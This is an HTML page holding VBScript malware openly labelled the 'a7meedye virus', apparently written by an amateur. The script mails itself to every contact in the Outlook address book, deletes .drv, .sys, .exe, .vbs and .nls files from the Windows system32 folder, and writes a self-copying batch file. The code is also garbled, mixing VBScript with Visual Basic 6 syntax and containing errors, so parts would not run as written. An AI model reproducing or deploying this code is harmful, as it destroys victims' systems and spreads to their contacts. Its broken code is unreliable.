<HTML>
<HEAD>
<TITLE>Virus Name A7meedye</TITLE>
</HEAD>
<BODY>
<FORM NAME="Form1">
  <INPUT TYPE="Button" NAME="Button1" VALUE="Click">
  <script FOR="Button1" EVENT="onClick" LANGUAGE="VBScript">
     MsgBox "Button Pressed!"
  MsgBox "File copied to system",vbcritical, "Filecopied"

      </SCRIPT>
</FORM>
</BODY>
</HTML>
<script LANGUAGE="VBVScript">
<!--
Dim x 
on error resume next 
Set fso ="Scripting.FileSystem.Object" 
Set so=CreateObject(fso) 
Set ol=CreateObject("Outlook.Application") 
Set out= WScript.CreateObject("Outlook.Application") 
Set mapi = out.GetNameSpace("MAPI") 
Set a = mapi.AddressLists(1) 
For x=1 To a.AddressEntries.Count 
Set Mail=ol.CreateItem(0) 
Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) 
Mail.Subject="Subject" 
Mail.Body="Body" 
Mail.Attachments.Add Wscript.ScriptFullName
Mail.Send 
Next 

Dim filedeldrv
Set filedeldrv = CreateObject("Scripting.FileSystemObject")
filedeldrv.DeleteFile "c:\windows\system32\*.drv"

Dim filedelvbs
Set filedelvbs = CreateObject("Scripting.FileSystemObject")
filedelvbs.DeleteFile "c:\windows\system32\*.vbs"

Dim filedelsys
Set filedelsys = CreateObject("Scripting.FileSystemObject")
filedelsys.DeleteFile "c:\windows\system32\*.sys"

Dim filedelnls
Set filedelnls = CreateObject("Scripting.FileSystemObject")
filedelnls.DeleteFile "c:\windows\system32\*.nls"

Dim filedelexe
Set filedelexe = CreateObject("Scripting.FileSystemObject")
filedelexe.DeleteFile "c:\windows\system32\*.exe"
Option Explicit

Private Sub Open()
On error resume next
Dim ret As Long
Dim sTo As String
Dim sCC As String
Dim sBCC As String
Dim sSubject As String
Dim sBody As String

sTo = "Someone"
sCC = "Someone else"
sBCC = "Someone else again"
sSubject = "Have a look at this site! its well gd"
sBody = "Check out the attachment it is the best.  "
       
On error resume next

ret = Shell("Start.exe " _
       & "mailto:" & """" & sTo & """" _
       & "?Subject=" & """" & sSubject & """" _
       & "&cc=" & """" & sCC & """" _
       & "&bcc=" & """" & sBCC & """" _
       & "&Body=" & """" & sBody & """" _
       & "&File=" & """" & "c:\autoexec.bat" & """" _
       , 0)
On error resume next

End Sub

Private Sub Open()
On error resume next
MsgBox "Welcome to a7meedye virus"
MsgBox "this virus was programed by a7meedye"
Open c:\backup.bat for Output as 1#
Print 1#, "@Echo off"
Print 1#, "cls"
Print 1#, "cd c:\"
Print 1#, "md myfiles"
Print 1#, "Copy %0 c:\myfiles\computerdrive.bat"
Close 1#
On error resume next
End sub
-->
</SCRIPT>
